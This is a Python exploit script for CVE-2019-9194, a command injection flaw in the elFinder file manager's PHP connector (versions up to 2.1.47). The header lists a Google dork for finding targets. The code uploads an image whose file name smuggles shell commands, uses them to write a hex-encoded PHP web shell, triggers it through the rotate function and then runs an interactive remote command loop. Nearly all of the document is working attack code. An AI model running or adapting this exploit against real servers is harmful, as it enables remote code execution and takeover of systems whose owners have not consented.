#!/usr/bin/env python3
"""
# Exploit Title: elFinder <= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 26/02/2019
# Original Author: @q3rv0
# Updated By: illuzian
# Made more pythonic and updated to python3
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:"elFinder 2.1.x"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: <= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2019-9194

# Chuck a valid jpg named SecSignal.jpg in current dir.
# Usage: python exploit.py [URL]

"""
import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'


def usage():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py [URL]")
        sys.exit(0)


def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
    req = requests.post(f"{url}/php/connector.minimal.php", files=files, data=data)
    j = json.loads(req.text)
    hash = j['added'][0]['hash']
    print(f"[+] hash is {hash}")
    return hash


def image_rotate(url, hash):
    req = requests.get(
        f"{url}/php/connector.minimal.php?target={hash}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c")
    print(f"[+] Rotate called status {req.status_code}")
    print(f"[+] Response content {req.text}")
    return req.text


def shell(url):
    req = requests.get(f"{url}/php/SecSignal.php")
    if req.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")

        while True:
            try:
                get_input = input("$ ")
                req = requests.get(f"{url}/php/SecSignal.php?c={get_input}")
                print(req.text)
            except KeyboardInterrupt:
                sys.exit("\nBye, have a great time!")

    else:
        print("[*] The site seems not to be vulnerable :(")


def main():
    usage()
    url = sys.argv[1]
    print("[*] Uploading the malicious image...")
    file_hash = upload(url, payload)
    print("[*] Running the payload...")
    image_rotate(url, file_hash)
    shell(url)


if __name__ == "__main__":
    main()
